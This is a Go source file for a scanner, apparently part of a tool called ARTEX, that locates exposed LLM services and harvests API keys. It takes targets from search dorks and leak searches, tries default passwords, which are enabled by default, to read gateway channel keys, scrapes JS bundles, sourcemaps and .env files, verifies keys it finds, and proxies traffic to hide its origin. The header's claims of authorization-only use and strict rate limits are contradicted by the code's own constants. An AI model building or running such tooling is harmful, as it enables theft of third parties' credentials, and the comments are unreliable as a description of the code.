// Package llmhunt 对**授权范围内**的目标做轻量大模型资产测绘：识别暴露的推理/
// 编排服务、判定未授权能力、在响应里识别泄露的密钥。
//
// 设计前提是"别把人站点搞坏"，所以引擎里写死了几条硬约束，而不是靠调用方自觉：
//   - 只发 GET；
//   - 同一主机串行、每次间隔 ≥1.2s、整台主机最多 8 个请求；
//   - 全局最多 4 台主机并发；
//   - 命中 403/418/429/503 立即放弃该主机，不重试、不绕过；
//   - 不扫端口段：只探调用方明确给出的端口（裸域名默认只 443/80）。
package llmhunt

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/Autumn-27/artex/db"
)

const (
	// perHostGap：同一主机两次请求的最小间隔。跨主机是并发的，所以这个值只影响
	// "同一站点内部的节奏"——它防的是把单个站点打疼，不是限制总速度。
	perHostGap     = 300 * time.Millisecond
	perHostMaxReqs = 8
	// globalHosts：同时探测的主机数。调高只增加"不同站点"的并行度。
	globalHosts  = 12
	bodyLimit    = 256 * 1024
	keyBodyLimit = 64 * 1024
	reqTimeout   = 12 * time.Second
)

// Target 是一台待测主机。
type Target struct {
	Host   string // 域名或 IP
	Port   int    // 0 = 按 443/80 处理
	Scheme string // 空 = 先 https 再 http
	Source string // seed / assets / search
	// Vendor 是来源提示（比如这条目标是从 "ComfyUI" 的搜索词里发现的）。
	// 有提示时只探该组件的那一个路径 —— 搜索发现的目标是第三方站点，探测必须更轻。
	Vendor string
}

// Options 控制一次扫描。
type Options struct {
	Targets []Target
	// Dorks 非空时先跑一轮搜索引擎发现：把结果里的主机抽出来当目标。
	// 这是"全网找"的合法形态 —— 通过搜索面找候选，而不是扫网段。
	Dorks []string
	// MaxFromSearch 限制搜索发现的目标数（默认 30）。
	MaxFromSearch int
	// AllowAuthChecks 允许"默认口令探测"（每个平台最多 2 组，失败即止）。
	// 默认**开**（见 e91cf3b：这是实际使用的默认）；这是唯一会用 POST 的动作，
	// 只适合在明确授权的目标上开。调用方想关就显式传 false。
	AllowAuthChecks bool
	// HuntLeaks 先跑"泄漏文件狩猎"：用 Hunter/Quake 找响应体里本来就含 key 的 URL。
	// 这是拿 key 最短的路径，优先级高于"先找实例再猜路径"。
	HuntLeaks bool
	// Repeat 让"泄漏文件狩猎"反复跑（每轮间隔 RepeatEvery），直到 Stop。
	// 只用于积累发现；不会自动验证/使用任何 key。
	Repeat      bool
	RepeatEvery time.Duration
	// MaxRounds 是持续狩猎的轮数上限（<=0 表示用默认值）。
	// 没有上限的话，持续狩猎可以一直跑下去——而测绘数据集是静态的，跑久了
	// 只会反复拿到同一批候选，既烧配额又被限流。
	MaxRounds int
	// StopAfterNoGain 是"连续多少轮没有新增产出就自动停"的阈值（<=0 用默认值）。
	// 产出 = 新增候选或新增 key。连续没有产出说明这一轮已经在空转了。
	StopAfterNoGain int
	// AutoVerify 开启后，每轮狩猎结束会对**新发现**的 key 各发一次免费只读请求，
	// 判断有效/无效（每轮上限 10 条）。默认关；只应在你有权验证的范围里开。
	AutoVerify bool
	// Proxy 是探测目标时使用的出口代理（http/socks5）。空 = 直连。
	// 走全局代理的目的很实际：别把 VPS 自己的 IP 打进各种黑名单，也别让
	// 目标看到"从机房 IP 来的扫描"。搜索/空间测绘的 API 调用仍走直连 ——
	// Quake/Hunter 是国内服务，绕道香港节点反而更慢甚至失败。
	Proxy string
	Note  string
}

const (
	// leakDefaultMaxRounds 是持续狩猎默认轮数上限（每轮 5 分钟 → 默认 2 小时）。
	leakDefaultMaxRounds = 24
	// leakDefaultNoGainLimit 是"连续多少轮无产出就自动停"的默认阈值。
	leakDefaultNoGainLimit = 3
)

// Discoverer 执行一次搜索并返回结果 URL。由上层注入（复用 ARTEX 已有的
// web_search 后端），llmhunt 自己不关心是 ddgs/brave/tavily。
type Discoverer func(ctx context.Context, query string, limit int) ([]string, error)

// Scanner 串行化整个进程内的扫描（同时只允许一次）。
type Scanner struct {
	pg        *db.DB
	client    *http.Client
	discover  Discoverer
	allowAuth bool
	// scanClient 是本次扫描专用的 client（按 Options.Proxy 构造，空则与 client 相同）。
	scanClient *http.Client
	// proxy 是本次扫描的出口代理原文：自动验证要用它构造 Verifier
	//（厂商 API 在墙外，直连必然超时，见 Verifier.SetProxy 的说明）。
	proxy string
	// lastGatewayToken 是最近一次网关默认口令登录成功的 token（读渠道用）。
	lastGatewayToken string
	// seenLeak 是泄漏狩猎的跨轮记忆：**抓成功过**的 URL → 抓取时间。
	// 记时间而不是记"见过"，是为了区分"抓过了"与"只是被列进候选"——
	// 后者不该拦掉下一轮（失败要能重试），前者到期后（TTL）也允许重抓。
	seenLeak map[string]time.Time

	mu      sync.Mutex
	running bool
	cancel  context.CancelFunc
	scanID  int64
	done    int
	assets  int
	keys    int

	// 诊断：让界面能说清楚"这轮为什么没产出"，而不是只显示一个"运行中"。
	lastRound    int    // 已跑轮数
	lastCands    int    // 上一轮候选 URL 数
	lastFetched  int    // 上一轮实际抓取数
	lastFound    int    // 上一轮新增 key 数
	lastErr      string // 上一轮的失败原因（限流等）
	stopReason   string // 自动停止的原因（连续无产出 / 达到轮数上限 / 手动停止）
	roundsNoGain int    // 连续多少轮没有新增产出
}

// pruneSeenLeak 修剪跨轮记忆：丢掉过期条目，表太大时再砍掉最旧的一半。
// 记忆表是给"这轮别重复抓"用的，长到几千条就该收一收，否则每轮 add() 都要全表扫。
func (s *Scanner) pruneSeenLeak() {
	cut := time.Now().Add(-leakSeenTTL)
	for u, at := range s.seenLeak {
		if at.Before(cut) {
			delete(s.seenLeak, u)
		}
	}
	if len(s.seenLeak) <= leakSeenMax {
		return
	}
	type kv struct {
		u string
		t time.Time
	}
	items := make([]kv, 0, len(s.seenLeak))
	for u, at := range s.seenLeak {
		items = append(items, kv{u, at})
	}
	sort.Slice(items, func(i, j int) bool { return items[i].t.Before(items[j].t) })
	for _, it := range items[:len(items)/2] {
		delete(s.seenLeak, it.u)
	}
}

// Diagnostics 是扫描器的诊断信息：界面要能说清楚"这轮为什么没产出"，
// 而不是只显示一个"运行中"。老实现只有一个 running 布尔值，用户看到
// "运行中"却什么都没发生，完全无从判断是测绘没数据、还是被限流、还是
// 候选集已耗尽。
type Diagnostics struct {
	Running        bool   `json:"running"`
	Rounds         int    `json:"rounds"`
	LastCandidates int    `json:"last_candidates"`
	LastFetched    int    `json:"last_fetched"`
	LastFound      int    `json:"last_found"`
	LastError      string `json:"last_error,omitempty"`
	StopReason     string `json:"stop_reason,omitempty"`
	RoundsNoGain   int    `json:"rounds_no_gain,omitempty"`
}

// Diagnostics 读取当前扫描的诊断信息。
func (s *Scanner) Diagnostics() Diagnostics {
	s.mu.Lock()
	defer s.mu.Unlock()
	return Diagnostics{
		Running:        s.running,
		Rounds:         s.lastRound,
		LastCandidates: s.lastCands,
		LastFetched:    s.lastFetched,
		LastFound:      s.lastFound,
		LastError:      s.lastErr,
		StopReason:     s.stopReason,
		RoundsNoGain:   s.roundsNoGain,
	}
}

// New 构造扫描器。
func New(pg *db.DB) *Scanner {
	return &Scanner{
		pg: pg,
		client: &http.Client{
			Timeout: reqTimeout,
			// 不跟随跳转：跳一次就多一次请求，也没必要。
			CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
		},
	}
}

// SetDiscoverer 注入搜索引擎（nil = 不支持搜索发现）。
func (s *Scanner) SetDiscoverer(d Discoverer) {
	s.mu.Lock()
	s.discover = d
	s.mu.Unlock()
}

// Running 报告是否有扫描在跑。
func (s *Scanner) Running() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.running
}

// Stop 停止当前扫描。
func (s *Scanner) Stop() {
	s.mu.Lock()
	cancel := s.cancel
	s.mu.Unlock()
	if cancel != nil {
		cancel()
	}
}

// Start 异步启动一次扫描，返回 scan id。
func (s *Scanner) Start(opts Options) (int64, error) {
	s.mu.Lock()
	if s.running {
		s.mu.Unlock()
		return 0, fmt.Errorf("已有扫描在进行中")
	}
	// 允许"只有搜索词"的扫描：目标由搜索引擎发现。
	if len(opts.Targets) == 0 && len(opts.Dorks) == 0 && !opts.HuntLeaks {
		s.mu.Unlock()
		return 0, fmt.Errorf("没有目标")
	}
	ctx, cancel := context.WithCancel(context.Background())
	s.running, s.cancel = true, cancel
	s.done, s.assets, s.keys = 0, 0, 0
	s.mu.Unlock()

	id, err := s.pg.StartLLMScan(len(opts.Targets))
	if err != nil {
		s.mu.Lock()
		s.running, s.cancel = false, nil
		s.mu.Unlock()
		cancel()
		return 0, err
	}
	s.mu.Lock()
	s.scanID = id
	s.allowAuth = opts.AllowAuthChecks
	s.proxy = strings.TrimSpace(opts.Proxy)
	s.scanClient = s.clientFor(opts.Proxy)
	// 新一轮扫描要清零诊断计数：否则会继承上一次扫描的"连续无产出"计数，
	// 让自动停止在第 1 轮就误触发（实测：新一轮第 1 轮就报"连续 2 轮无产出"）。
	s.lastRound, s.lastCands, s.lastFetched, s.lastFound = 0, 0, 0, 0
	s.lastErr, s.stopReason, s.roundsNoGain = "", "", 0
	s.mu.Unlock()

	go s.run(ctx, id, opts)
	return id, nil
}

// clientFor 按出口代理构造 client：空则直连。socks5:// 由 Transport 原生支持。
func (s *Scanner) clientFor(proxy string) *http.Client {
	proxy = strings.TrimSpace(proxy)
	if proxy == "" {
		return s.client
	}
	u, err := url.Parse(proxy)
	if err != nil {
		s.logf("代理地址无效(%s)，本次直连: %v", proxy, err)
		return s.client
	}
	tr := &http.Transport{
		Proxy:                 http.ProxyURL(u),
		TLSHandshakeTimeout:   10 * time.Second,
		ResponseHeaderTimeout: 15 * time.Second,
		MaxIdleConns:          8,
	}
	return &http.Client{
		Timeout:       reqTimeout,
		Transport:     tr,
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
	}
}

// run 是扫描主循环：全局并发 globalHosts，每台主机内部串行。
func (s *Scanner) run(ctx context.Context, scanID int64, opts Options) {
	defer func() {
		s.mu.Lock()
		status := "done"
		if ctx.Err() != nil {
			status = "stopped"
		}
		done, assets, keys := s.done, s.assets, s.keys
		s.running, s.cancel = false, nil
		s.mu.Unlock()
		_ = s.pg.UpdateLLMScan(scanID, done, assets, keys, status, opts.Note)
	}()

	// ① 泄漏文件狩猎优先：直接找"响应里已经有 key"的 URL。
	if opts.HuntLeaks {
		every := opts.RepeatEvery
		if every <= 0 {
			every = 5 * time.Minute
		}
		maxRounds := opts.MaxRounds
		if maxRounds <= 0 {
			maxRounds = leakDefaultMaxRounds
		}
		noGainLimit := opts.StopAfterNoGain
		if noGainLimit <= 0 {
			noGainLimit = leakDefaultNoGainLimit
		}
		for round := 1; ; round++ {
			if ctx.Err() != nil {
				break
			}
			before := s.keysNow()
			fetched, found, lerr := s.huntLeaks(ctx)
			verified := ""
			if opts.AutoVerify && found > 0 {
				t, okV := s.VerifyNewKeys(ctx, 10)
				if t > 0 {
					verified = fmt.Sprintf("，自动验证 %d 条（有效 %d）", t, okV)
				}
			}
			// 诊断：这一轮到底发生了什么，界面要能显示出来。
			errText := ""
			rawErr := ""
			if lerr != nil {
				rawErr = lerr.Error()
				errText = "，" + rawErr
			}
			s.logf("泄漏狩猎第 %d 轮：抓取 %d 个 URL，命中 %d 条 key（累计 %d）%s%s", round, fetched, found, s.keysNow(), verified, errText)

			gained := found > 0 || s.keysNow() > before
			noGain := 0
			stopReason := ""
			if !gained {
				noGain = s.roundsNoGain + 1
			}
			switch {
			case round >= maxRounds:
				stopReason = fmt.Sprintf("达到轮数上限（%d 轮）", maxRounds)
			case noGain >= noGainLimit:
				stopReason = fmt.Sprintf("连续 %d 轮没有新增产出，自动停止（测绘数据集已无新料，可手动再开）", noGain)
			}
			note := fmt.Sprintf("第 %d 轮 · 抓取 %d 个 URL · 本轮命中 %d · 累计 %d 条 key%s%s",
				round, fetched, found, s.keysNow(), verified, errText)
			if stopReason != "" {
				note += " · " + stopReason
			}
			s.mu.Lock()
			s.lastRound, s.lastCands, s.lastFetched, s.lastFound = round, fetched, fetched, found
			s.lastErr = rawErr
			s.roundsNoGain = noGain
			if stopReason != "" {
				s.stopReason = stopReason
			}
			s.mu.Unlock()
			_ = s.pg.UpdateLLMScan(scanID, fetched, s.assets, s.keys, "", note)
			if stopReason != "" {
				s.logf("持续狩猎结束：%s", stopReason)
				break
			}
			if !opts.Repeat {
				break
			}
			select {
			case <-ctx.Done():
				return
			case <-time.After(every):
			}
		}
	}

	// ② 搜索发现：放在后台做，别把 HTTP 请求拖成长连接。
	targets := opts.Targets
	if len(opts.Dorks) > 0 {
		found := s.discoverTargets(ctx, opts.Dorks, opts.MaxFromSearch)
		targets = append(targets, found...)
		_ = s.pg.SetLLMScanTotal(scanID, len(targets))
	}
	if len(targets) == 0 {
		s.logf("没有可用目标")
		return
	}

	sem := make(chan struct{}, globalHosts)
	var wg sync.WaitGroup
	tick := time.NewTicker(2 * time.Second) // 进度落库节流
	defer tick.Stop()
	go func() {
		for range tick.C {
			s.mu.Lock()
			done, assets, keys := s.done, s.assets, s.keys
			s.mu.Unlock()
			_ = s.pg.UpdateLLMScan(scanID, done, assets, keys, "", "")
		}
	}()

	for _, t := range targets {
		select {
		case <-ctx.Done():
			break
		case sem <- struct{}{}:
		}
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		go func(t Target) {
			defer wg.Done()
			defer func() { <-sem }()
			s.scanHost(ctx, t)
			s.mu.Lock()
			s.done++
			s.mu.Unlock()
		}(t)
	}
	wg.Wait()
}

// scanHost 探一台主机的候选端口/路径。
func (s *Scanner) scanHost(ctx context.Context, t Target) {
	ports := []int{t.Port}
	if t.Port == 0 {
		ports = []int{443, 80}
	}
	for _, port := range ports {
		if ctx.Err() != nil {
			return
		}
		schemes := []string{t.Scheme}
		if t.Scheme == "" {
			if port == 443 {
				schemes = []string{"https"}
			} else if port == 80 {
				schemes = []string{"http"}
			} else {
				schemes = []string{"https", "http"}
			}
		}
		for _, scheme := range schemes {
			base := fmt.Sprintf("%s://%s:%d", scheme, t.Host, port)
			if s.probeHost(ctx, base, t) {
				return // 命中即停，不再试其它 scheme/port
			}
		}
	}
}

// probeHost 对一台主机做指纹探测；命中返回 true。
// 请求次数被 perHostMaxReqs 卡死，且每次间隔 perHostGap。
func (s *Scanner) probeHost(ctx context.Context, base string, t Target) bool {
	budget := perHostMaxReqs
	var matched *probe
	var evidence []string
	var bodyCache string

	list := probes
	if t.Vendor != "" {
		// 搜索发现的目标是第三方站点：只打该组件的一个路径，命中就停。
		list = list[:0:0]
		for _, p := range probes {
			if p.vendor == t.Vendor {
				list = append(list, p)
				break
			}
		}
	}
	for _, p := range list {
		if budget <= 0 || ctx.Err() != nil {
			break
		}
		budget--
		status, body, ctype := s.get(ctx, base+p.path, bodyLimit)
		if status == 0 || status == 403 || status == 418 || status == 429 || status == 503 {
			// 站点在拒绝/限流：立刻放弃这台主机，不重试也不换路径。
			return false
		}
		if status == 200 && strings.Contains(strings.ToLower(ctype), "json") {
			if p.wantBody == "" || strings.Contains(body, p.wantBody) {
				pp := p
				matched = &pp
				evidence = append(evidence, fmt.Sprintf("%s → 200 JSON", p.path))
				bodyCache = body
				break
			}
		}
		time.Sleep(perHostGap)
	}
	if matched == nil {
		return false
	}

	asset := &db.LLMAsset{
		URL: base, Host: t.Host, Port: portOf(base),
		Vendor: matched.vendor, Source: t.Source,
		Evidence: strings.Join(evidence, "; "),
		Models:   extractModels(matched.vendor, bodyCache),
		// 能读到模型清单/配置就说明"无需凭据即可访问"，这就是未授权访问本身。
		Unauth: true,
	}
	if matched.version != "" && budget > 0 {
		time.Sleep(perHostGap)
		budget--
		if st, body, _ := s.get(ctx, base+matched.version, 4096); st == 200 {
			asset.Version = extractVersion(body)
			asset.Evidence += fmt.Sprintf("; %s → 200", matched.version)
		}
	}
	assetID, err := s.pg.UpsertLLMAsset(asset)
	if err != nil {
		return true
	}
	s.mu.Lock()
	s.assets++
	s.mu.Unlock()

	// 密钥：搜索发现的目标更克制 —— 只多探 1 个路径。
	if t.Source == "search" {
		budget = minInt(budget, 1)
	}
	s.harvestKeys(ctx, base, assetID, &budget, matched.vendor)

	// 默认口令探测（仅在显式开启时）：登录后读鉴权接口里的 key。
	if s.allowAuth && budget > 0 {
		ok2, stop := s.tryDefaultAuth(ctx, base, assetID, matched.vendor, &budget)
		if stop {
			return true
		}
		// 网关命中（one-api/new-api）：渠道响应里的 key 字段走专用提取，
		// 比通用正则准——直接对准 "key":"sk-..." 字段。
		if ok2 && (matched.vendor == "one-api" || matched.vendor == "new-api") {
			for _, p := range []string{"/api/channel/?p=0&page_size=100", "/api/channel/"} {
				st, body2, _ := s.getWithAuth(ctx, base+p, s.lastGatewayToken)
				if st == 200 && body2 != "" {
					s.extractChannelKeys(base+p, assetID, body2)
				}
			}
		}
	}
	return true
}

// harvestKeys 在授权目标自身的响应里识别密钥。
//
// GET-only 能拿到的密钥只有一类：**本来就会随响应发给浏览器的**。具体是
//  1. 首页内联脚本与它引用的 JS bundle —— 构建期把 process.env 内联进去的 key
//     全在这里，是现实中泄漏量最大的一处；
//  2. .env / config.json / actuator/env / .git/config 这类误暴露的配置；
//  3. 组件自己的未授权工作流/配置接口（Flowise、Langflow、n8n 的工作流 JSON 里
//     常常直接写着模型 key）。
//
// 需要登录、需要注入、需要 RCE 才能读到的 key，GET 一律拿不到 —— 那属于漏洞利用，
// 不在这个功能的范围内。
func (s *Scanner) harvestKeys(ctx context.Context, base string, assetID int64, budget *int, vendor string) {
	// 先打该组件自己的"漏 key"接口，再看通用误暴露文件。
	candidates := append([]string{"/"}, vendorKeyPaths[vendor]...)
	candidates = append(candidates, keyPaths...)

	found := 0
	var homeBody string
	for _, p := range candidates {
		if *budget <= 0 || found >= 40 || ctx.Err() != nil {
			return
		}
		*budget--
		time.Sleep(perHostGap)
		status, body, _ := s.get(ctx, base+p, bodyLimit)
		if status != 200 || body == "" {
			continue
		}
		if p == "/" {
			homeBody = body
		}
		found += s.extractKeys(base+p, assetID, body)
	}

	// 首页内联之后，再跟进它引用的前几个同源 JS：密钥绝大多数藏在这里。
	if homeBody == "" || *budget <= 0 {
		return
	}
	for _, js := range scriptSources(homeBody, base, 4) {
		if *budget <= 0 || found >= 40 || ctx.Err() != nil {
			return
		}
		*budget--
		time.Sleep(perHostGap)
		status, body, _ := s.get(ctx, js, bodyLimit)
		if status != 200 || body == "" {
			continue
		}
		found += s.extractKeys(js, assetID, body)
		// sourcemap 里是原始源码，比压缩后的 bundle 更容易拍到明文 key。
		if mm := sourceMapRef(body); mm != "" && *budget > 0 {
			if mu, err := resolveRef(js, mm); err == nil {
				*budget--
				time.Sleep(perHostGap)
				if st, mb, _ := s.get(ctx, mu, bodyLimit); st == 200 {
					found += s.extractKeys(mu, assetID, mb)
				}
			}
		}
	}
}

// channelKeyRE 是 one-api/new-api 渠道列表 JSON 里 key 字段的专用提取：
// "key":"sk-..."——比通用正则更准，直接对准上游凭据字段。
var channelKeyRE = regexp.MustCompile(`"key"\s*:\s*"(sk-[A-Za-z0-9_-]{20,}|AIza[0-9A-Za-z_-]{35})"`)

// extractChannelKeys 从渠道列表 JSON 里提取上游 key（one-api/new-api 专用）。
func (s *Scanner) extractChannelKeys(src string, assetID int64, body string) int {
	n := 0
	for _, m := range channelKeyRE.FindAllStringSubmatch(body, 100) {
		key := m[1]
		if !looksLikeRealKey(key) {
			continue
		}
		if ok, _ := s.pgKeyInsert(src+"#channel", "OpenAI", key, "gateway-channel"); ok {
			n++
		}
	}
	return n
}

// extractKeys 用正则扫响应体，命中即落库（只存原文+掩码，原文不外传）。
func (s *Scanner) extractKeys(srcURL string, assetID int64, body string) int {
	n := 0
	for _, kp := range keyPatterns {
		for _, m := range kp.re.FindAllString(body, 5) {
			if !looksLikeRealKey(m) {
				continue
			}
			sum := sha256.Sum256([]byte(m))
			ok, err := s.pg.InsertLLMKey(&db.LLMKey{
				AssetID:     assetID,
				URL:         srcURL,
				KeyType:     kp.name,
				Raw:         m,
				Masked:      mask(m),
				Fingerprint: hex.EncodeToString(sum[:8]),
				Context:     kp.name + " 出现在 " + srcURL,
			})
			if err != nil {
				continue
			}
			if ok {
				n++
			}
		}
	}
	if n > 0 {
		s.mu.Lock()
		s.keys += n
		s.mu.Unlock()
	}
	return n
}

// get 发一个 GET，返回状态码与（截断的）响应体。
func (s *Scanner) get(ctx context.Context, rawURL string, limit int64) (int, string, string) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return 0, "", ""
	}
	// 中性 UA、不带 Cookie/Referer：尽量不触发风控，也不伪装成浏览器。
	req.Header.Set("User-Agent", "ARTEX-LLM-Recon/1.0")
	req.Header.Set("Accept", "*/*")
	resp, err := s.scanClientOrDefault().Do(req)
	if err != nil {
		return 0, "", ""
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, limit))
	return resp.StatusCode, string(b), resp.Header.Get("Content-Type")
}

// extractModels 从响应体里取模型名（最多 50 个）。
func extractModels(vendor, body string) []string {
	var out []string
	switch vendor {
	case "ollama":
		var v struct {
			Models []struct {
				Name string `json:"name"`
			} `json:"models"`
		}
		if json.Unmarshal([]byte(body), &v) == nil {
			for _, m := range v.Models {
				if m.Name != "" && len(out) < 50 {
					out = append(out, m.Name)
				}
			}
		}
	case "openai-compatible":
		var v struct {
			Data []struct {
				ID string `json:"id"`
			} `json:"data"`
		}
		if json.Unmarshal([]byte(body), &v) == nil {
			for _, m := range v.Data {
				if m.ID != "" && len(out) < 50 {
					out = append(out, m.ID)
				}
			}
		}
	}
	return out
}

func extractVersion(body string) string {
	var v map[string]any
	if json.Unmarshal([]byte(body), &v) != nil {
		return ""
	}
	for _, k := range []string{"version", "Version", "app_version"} {
		if s, ok := v[k].(string); ok {
			return s
		}
	}
	return ""
}

func portOf(rawURL string) int {
	u, err := url.Parse(rawURL)
	if err != nil {
		return 0
	}
	switch u.Scheme {
	case "https":
		if u.Port() == "" {
			return 443
		}
	case "http":
		if u.Port() == "" {
			return 80
		}
	}
	p := 0
	fmt.Sscanf(u.Port(), "%d", &p)
	return p
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// scanClientOrDefault 返回本次扫描的 client（未设置时回落到默认）。
func (s *Scanner) scanClientOrDefault() *http.Client {
	s.mu.Lock()
	c := s.scanClient
	s.mu.Unlock()
	if c != nil {
		return c
	}
	return s.client
}

// keysNow 返回本轮已登记的 key 数。
func (s *Scanner) keysNow() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.keys
}
